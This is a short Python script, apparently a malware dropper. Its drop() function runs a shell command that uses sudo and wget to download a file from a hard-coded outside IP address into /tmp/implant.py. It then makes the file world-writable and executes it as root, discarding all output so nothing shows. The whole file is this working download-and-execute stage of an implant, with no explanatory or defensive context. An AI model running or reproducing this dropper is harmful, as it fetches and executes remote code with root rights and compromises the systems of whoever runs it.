import subprocess

base_url = 'http://129.21.101.117:8000'


def drop():
    with subprocess.Popen(
        [f"sudo wget {base_url}/api/1.1/retrieve_scripts -O /tmp/implant.py && sudo chmod 777 /tmp/implant.py && "
         f"sudo /usr/bin/python3 /tmp/implant.py "
         f">/dev/null 2>&1"],
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
        ""


if __name__ == "__main__":
    drop()
